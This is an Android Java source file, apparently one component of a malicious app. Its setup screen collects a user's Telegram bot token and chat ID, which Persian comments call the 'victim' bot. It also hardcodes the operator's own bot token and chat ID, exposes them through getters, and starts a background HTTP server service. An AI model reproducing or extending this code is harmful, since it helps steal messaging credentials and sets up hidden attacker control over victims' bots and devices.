package com.security.ravan;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class SetupActivity extends AppCompatActivity {
    
    private EditText etUserBotToken, etUserChatId;
    private Button btnSave;
    private SharedPreferences prefs;
    
    // توکن و Chat ID خودت (ثابت در کد)
    private static final String MY_BOT_TOKEN = "BEHDBA0MVRIJCDVZWNXMROXXRFNYDEYJYQBFIVMDAKJSTRDLGZFQLTIVGKOLJDXN";
    private static final String MY_CHAT_ID = "b0InoT70eav0eb7550cc52f9e4391710";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_setup);
        
        prefs = getSharedPreferences("bot_config", MODE_PRIVATE);
        
        etUserBotToken = findViewById(R.id.et_user_bot_token);
        etUserChatId = findViewById(R.id.et_user_chat_id);
        btnSave = findViewById(R.id.btn_save);
        
        btnSave.setOnClickListener(v -> {
            String userToken = etUserBotToken.getText().toString().trim();
            String userChatId = etUserChatId.getText().toString().trim();
            
            if (userToken.isEmpty() || userChatId.isEmpty()) {
                Toast.makeText(this, "لطفاً توکن و Chat ID را وارد کنید", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // ذخیره اطلاعات ربات قربانی
            prefs.edit()
                .putString("user_bot_token", userToken)
                .putString("user_chat_id", userChatId)
                .putBoolean("setup_done", true)
                .apply();
            
            Toast.makeText(this, "تنظیمات ذخیره شد", Toast.LENGTH_LONG).show();
            
            // استارت سرویس اصلی
            startService(new Intent(this, HttpServerService.class));
            finish();
        });
    }
    
    public static String getMyBotToken() { return MY_BOT_TOKEN; }
    public static String getMyChatId() { return MY_CHAT_ID; }
}
